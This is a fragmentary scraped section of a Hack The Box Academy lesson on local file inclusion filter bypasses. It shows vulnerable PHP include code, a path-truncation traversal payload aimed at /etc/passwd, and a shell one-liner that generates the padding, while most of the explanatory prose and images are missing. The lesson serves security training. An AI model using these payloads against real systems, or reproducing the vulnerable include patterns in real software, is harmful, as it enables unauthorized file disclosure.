<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/23/section/1491
// Platform Version: V1
// Module ID: 23
// Module Name: File Inclusion
// Module Difficulty: Medium
// Section ID: 1491
// Section Title: Basic Bypasses
// Page Title: Hack The Box - Academy
// Page Number: 3
-->

# Basic Bypasses

**Module Name:** File Inclusion **Page Number:** 3

#### 

#### FILE INCLUSION

# Basic Bypasses

## Non-Recursive Path Traversal Filters

``` php
$language = str_replace('../', '', $_GET['language']);
```

![https://academy.hackthebox.com/storage/modules/23/lfi_blacklist.png](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist.png)

![https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd.png](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd.png)

## Encoding

![https://academy.hackthebox.com/storage/modules/23/burp_url_encode.jpg](https://academy.hackthebox.com/storage/modules/23/burp_url_encode.jpg)

![https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)

## Approved Paths

``` php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

![https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png](https://academy.hackthebox.com/storage/modules/23/lfi_blacklist_passwd_filter.png)

## Appended Extension

#### Path Truncation

``` url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

``` shell-session
ndefstathiou@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

#### Null Bytes

# 

# 

#### Questions

####